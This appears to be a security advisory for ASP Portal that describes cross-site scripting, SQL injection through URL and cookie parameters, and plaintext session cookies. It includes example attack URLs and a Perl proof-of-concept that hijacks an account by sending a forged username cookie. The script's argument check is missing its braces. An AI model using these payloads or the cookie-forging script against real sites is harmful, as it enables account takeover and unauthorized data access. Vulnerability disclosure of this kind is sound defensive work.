source: http://www.securityfocus.com/bid/9659/info

ASP Portal has been reported to be prone to multiple vulnerabilities.

The first issue results from a lack of sufficient sanitization performed on user supplied data that is later incorporated into dynamic content. An attacker may reportedly inject HTML code into ASP Portal details page.

The second issue, also results from a lack of sufficient sanitization performed on URI parameters. It has been reported that an attacker may craft a link to the ASP Portal 'index.asp' page, passing script code and HTML content as the value for the affected URI parameters. This malicious code will be executed in the browser of a user who follows the link in the context of the vulnerable site.

The third vulnerability again results from a lack of sufficient sanitization. When collecting user-supplied data that will be later incorporated into an SQL query statement, the software fails to filter certain control characters. An attacker may provide SQL statements as a value for URI parameters that are passed to the 'index.asp' script.

The fourth vulnerability again results from a lack of sufficient sanitization. When collecting user-supplied data from cookie parameters that will be later incorporated into an SQL query statement, the software fails to filter certain control characters. An attacker may provide SQL statements as a value for the affected cookie parameter.

Finally a vulnerability in the methods used to store session cookies has been reported. The issue presents itself due to the user name associated with the current session being stored in plaintext format.

http://www.example.com/index.asp?inc='>[XSS]
http://www.example.com/index.asp?inc=profile&searchtext='>[XSS]
http://www.example.com/index.asp?inc=forumread&article='>[XSS]
http://www.example.com/index.asp?inc=blog&pageid='[SqlQuery]
http://www.example.com/index.asp?inc=downloadssub&downloadscat='[SqlQuery]

#!/usr/bin/perl -w
## PROOF OF CONCEPT COOKIE ACCOUNT HIJACK
## Example: Asp-POC.pl localhost portal/index.asp Admin respuesta.htm

use IO::Socket;
if (@ARGV < 4)
 
print "\n\n";
print " ____________________________________________________________ \n";
print "|                                                            |\n";
print "|   PROOF OF CONCEPT COOKIE ACCOUNT HIJACK                   |\n";
print "|   Usage:Asp-POC.pl [host] [directorio] [usuario] [fichero] |\n";
print "|                                                            |\n";
print "|   By: Manuel L?pez #IST                                    |\n";
print "|____________________________________________________________|\n";
print "\n\n";
exit(1);
 

$host = $ARGV[0];
$directorio = $ARGV[1];
$usuario = $ARGV[2];
$fichero = $ARGV[3];

print "\n";
print "----- Conectando <----\n";
$socket = IO::Socket::INET->new(Proto => "tcp",
PeerAddr => "$host",PeerPort => "80") || die "$socket error $!";
print "====> Conectado\n";
print "====> Enviando Datos\n";
$socket->print(<<taqui) or die "write: $!";
GET http://$host/$directorio HTTP/1.1
Cookie: thenick=$usuario

taqui
print "====> OK\n";
print "====> Generando $fichero ...\n";
open( Result, ">$fichero");
print Result while <$socket>;
close Result;